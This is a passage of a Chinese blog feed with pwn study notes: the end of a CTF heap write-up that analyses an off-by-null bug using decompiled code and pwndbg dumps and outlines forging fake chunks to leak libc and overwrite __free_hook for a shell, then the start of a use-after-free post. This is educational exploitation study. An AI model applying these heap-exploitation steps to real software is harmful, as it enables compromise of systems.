class=\"number\">0</span> )</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_2;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Enter book name (Max 32 chars): &quot;</span>);</span><br><span class=\"line\">  ptr = <span class=\"built_in\">malloc</span>(v1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !ptr )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;unable to allocate enough space&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_17;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)readName(ptr, v1 - <span class=\"number\">1</span>) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;fail to read name&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_17;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\nEnter book description size: &quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">LABEL_2:</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Malformed size&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v5 = <span class=\"built_in\">malloc</span>(v1);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v5 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Enter book description: &quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)readName(v5, v1 - <span class=\"number\">1</span>) )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Unable to read description&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v2 = sub_B24();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v2 == <span class=\"number\">-1</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Library is full&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          v3 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( v3 )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            *((_DWORD *)v3 + <span class=\"number\">6</span>) = v1;</span><br><span class=\"line\">            *((_QWORD *)off_202010 + v2) = v3;</span><br><span class=\"line\">            *((_QWORD *)v3 + <span class=\"number\">2</span>) = v5;</span><br><span class=\"line\">            *((_QWORD *)v3 + <span class=\"number\">1</span>) = ptr;</span><br><span class=\"line\">            *(_DWORD *)v3 = ++unk_202024;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Unable to allocate book struct&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Fail to allocate memory&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">LABEL_17:</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( ptr )</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v5 )</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(v5);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v3 )</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(v3);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t分析一波，有一些需要记住作用的阿变量名，比如 v1：</p>\n<blockquote>\n<ul>\n<li>\n<p>v1 可以很明显看出来，v1 是存放的是 book 的 name 的大小，ptr 就是 name 存放的地址：</p>\n</li>\n<li>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>v1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nEnter book name size: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">goto</span> LABEL_2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Enter book name (Max 32 chars): \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  ptr <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span>code￼<span class=\"token number\">5</span><span class=\"token operator\">--</span><span class=\"token operator\">></span></pre></td></tr></table></figure></li>\n<li>\n<p>之后开了个 v3，存放了 book 的所有信息：</p>\n</li>\n<li>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>v3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x20uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>          <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v3 <span class=\"token operator\">+</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>off_202010 <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> v3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v3 <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> v5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v3 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> ptr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v3 <span class=\"token operator\">=</span> <span class=\"token operator\">++</span>unk_202024<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>          <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span>code￼<span class=\"token number\">6</span><span class=\"token operator\">--</span><span class=\"token operator\">></span></pre></td></tr></table></figure></li>\n</ul>\n</blockquote>\n<p>​\t\t分配两次，代码类似这样：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">&quot;book1_name&quot;</span>,<span class=\"number\">200</span>,<span class=\"string\">&quot;book1_destruct&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x21000</span>,<span class=\"string\">&quot;book1_name&quot;</span>,<span class=\"number\">0x21000</span>,<span class=\"string\">&quot;book1_destruct&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>​\t\t这个函数存在一些问题，a1 是我们想要写入的字符串的起始地址，a2 是判定边缘，但是，从 0 开始，一直到 a2 为止，很显然多进行了一次读入，因为这里的逻辑是先读入，再判断 i 与 a2 是否相等，所以这里就多循环了一次，造成了 offbyone，结束循环之后，又将后一位的内存修改成了 \\x00，因此发生了溢出，例如一个数组是 32 字节，这个程序调用这个函数的时候，一直都是用的 size-1，所以传入的是 31，这个程序就刚好做到了让整个数组刚好可以写满，也就是写道 buf [31]，这里刚好写满，但是，有个关键的问题，最后一个还操作了一下，让 * a1=0，这也就导致了 buf [32]=0 的发生，溢出了一个字节，也就造成了 offbyone，或者说 off by null。</p>\n<p>​\t\t上 gdb 看看，先输入 32 个 a 作为名字之后，那段内存变成了这样：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">search aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span></span><br><span class=\"line\">Searching for value: &#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span><br><span class=\"line\">pwn             0x555555602040 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30gx 0x555555602040</span></span><br><span class=\"line\">0x555555602040: 0x6161616161616161      0x6161616161616161</span><br><span class=\"line\">0x555555602050: 0x6161616161616161      0x6161616161616161</span><br><span class=\"line\">0x555555602060: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555602070: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555602080: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555602090: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555556020a0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555556020b0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555556020c0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555556020d0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555556020e0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555556020f0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555602100: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555602110: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555602120: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里我想着直接通过 IDA 反编译的来确定这俩 BSS 段数据的地址的，结果 IDA 里莫名其妙的，有点怪怪的，这里就直接 GDB 调算偏移然后算真实地址之类的吧。首先，刚刚那里确定了作者 name 的那个地址为：0x555555602040，gdb 里调的时候查到 elf 的基地址为：0x555555400000（手动计算出来的），然后算出 bss 里作者 name 的偏移为：0x202040，加起来之后和 0x555555602040 这个地址一样，所以，可以断定，这个地址就是存放作者名字的地方，之后，经过两次申请内存之后，再看看 0x555555602040 地址的内存（根据结构体指针数组在 bss 段上，然后暴力经过两次 malloc 之后查询 bss 段内容有无变化发现了一些少量变化，由此定位结构体指针数组的地址）：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30gx 0x555555602040</span></span><br><span class=\"line\">0x555555602040: 0x6161616161616161      0x6161616161616161</span><br><span class=\"line\">0x555555602050: 0x6161616161616161      0x6161616161616161</span><br><span class=\"line\">0x555555602060: 0x00005555556037a0      0x00005555556037d0</span><br><span class=\"line\">0x555555602070: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555602080: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555602090: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555556020a0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555556020b0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555556020c0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555556020d0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555556020e0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555556020f0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555602100: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555602110: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555602120: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t发现 0x555555602060 这个地址的内容变了，并且，还是某个书的结构体的数据域的地址：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30gx 0x00005555556037a0</span></span><br><span class=\"line\">0x5555556037a0: 0x0000000000000001      0x00005555556036b0</span><br><span class=\"line\">0x5555556037b0: 0x00005555556036d0      0x00000000000000c8</span><br><span class=\"line\">0x5555556037c0: 0x0000000000000000      0x0000000000000031</span><br><span class=\"line\">0x5555556037d0: 0x0000000000000002      0x00007ffff7d66010</span><br><span class=\"line\">0x5555556037e0: 0x00007ffff7d44010      0x0000000000021000</span><br><span class=\"line\">0x5555556037f0: 0x0000000000000000      0x0000000000020811</span><br><span class=\"line\">0x555555603800: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603810: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603820: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603830: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603840: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603850: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603860: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603870: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603880: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t刚好整个程序存在一个修改作者名字的功能，可以修改作者名字，进行第二次 off by null，修改 0x00005555556036f0 为 0x0000555555603600：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30gx 0x555555602040</span></span><br><span class=\"line\">0x555555602040: 0x6262626262626262      0x6262626262626262</span><br><span class=\"line\">0x555555602050: 0x6262626262626262      0x6262626262626262</span><br><span class=\"line\">0x555555602060: 0x0000555555603700      0x00005555556037d0</span><br><span class=\"line\">0x555555602070: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555602080: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555602090: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555556020a0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555556020b0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555556020c0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555556020d0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555556020e0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555556020f0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555602100: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555602110: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555602120: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t那么，0x0000555555603600 这个地址指向的地方是哪里呢？用 heap 指令看看：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555603000</span><br><span class=\"line\">Size: 0x290 (with flag bits: 0x291)</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555603290</span><br><span class=\"line\">Size: 0x410 (with flag bits: 0x411)</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555556036a0</span><br><span class=\"line\">Size: 0x20 (with flag bits: 0x21)</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555556036c0</span><br><span class=\"line\">Size: 0xd0 (with flag bits: 0xd1)</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555603790</span><br><span class=\"line\">Size: 0x30 (with flag bits: 0x31)</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555556037c0</span><br><span class=\"line\">Size: 0x30 (with flag bits: 0x31)</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555556037f0</span><br><span class=\"line\">Size: 0x20810 (with flag bits: 0x20811)</span><br></pre></td></tr></table></figure>\n<p>​\t\t发现这个地址是在 book1_desc 的中间：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/50gx 0x5555556036c0</span></span><br><span class=\"line\">0x5555556036c0: 0x0000000000000000      0x00000000000000d1</span><br><span class=\"line\">0x5555556036d0: 0x65645f316b6f6f62      0x0000000000006373</span><br><span class=\"line\">0x5555556036e0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x5555556036f0: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603700: 0x0000000000000000      0x0000000000000000\t\t\t&lt;-------------------</span><br><span class=\"line\">0x555555603710: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603720: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603730: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603740: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603750: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603760: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603770: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603780: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603790: 0x0000000000000000      0x0000000000000031</span><br><span class=\"line\">0x5555556037a0: 0x0000000000000001      0x00005555556036b0</span><br><span class=\"line\">0x5555556037b0: 0x00005555556036d0      0x00000000000000c8</span><br><span class=\"line\">0x5555556037c0: 0x0000000000000000      0x0000000000000031</span><br><span class=\"line\">0x5555556037d0: 0x0000000000000002      0x00007ffff7d66010</span><br><span class=\"line\">0x5555556037e0: 0x00007ffff7d44010      0x0000000000021000</span><br><span class=\"line\">0x5555556037f0: 0x0000000000000000      0x0000000000020811</span><br><span class=\"line\">0x555555603800: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603810: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603820: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603830: 0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x555555603840: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t内存布局大概有了，这里借用某位大佬的图（hollk）：</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/5946f3207d5348e39aa969baf50b0db3.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t修改了 book1 的结构体指针地址之后，因为 book1_name 这里是可控的，所以可以在指向的那个地址伪造一个 fake_chunk，</p>\n<p>​\t\t因为后面确实对我而言有点逆天，所以之后就简述了吧，之后就是伪造 chunk 泄露 libc 地址，然后继续伪造 fakechunk 修改 <code>__free_hook</code>  为 one_gadget，即可拿到 shell。</p>\n",
            "tags": [
                "Pwn"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/540e5c20.html",
            "url": "http://blog.g01den.top/posts/540e5c20.html",
            "title": "Pwn学习笔记（10）--UAF",
            "date_published": "2024-11-05T03:47:12.000Z",
            "content_html": "<h1 id=\"pwn学习笔记10uaf\"><a class=\"markdownIt-Anchor\" href=\"#pwn学习笔记10uaf\">#</a> Pwn 学习笔记（10）–UAF：</h1>\n<p>​\t\tUAF 就是 Use-After-Free，即一个指向堆块的指针被释放后指针没有置零，形成了悬空指针，使得堆可以再次被使用。</p>\n<p>​\t\t由于我环境似乎运行不了某个程序，所以演示就不做了，上个简单题来看看。</p>\n<p>​\t\t题目是一个标准的菜单题，有创建 note 和输出删除的功能，别的不看了，直接看那三个函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">add_note</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v0; <span class=\"comment\">// ebx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [esp+Ch] [ebp-1Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> size; <span class=\"comment\">// [esp+10h] [ebp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">8</span>]; <span class=\"comment\">// [esp+14h] [ebp-14h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v5; <span class=\"comment\">// [esp+1Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( count &lt;= <span class=\"number\">5</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">4</span>; ++i )</span><br><span class=\"line\">    &#123;</span><br><span 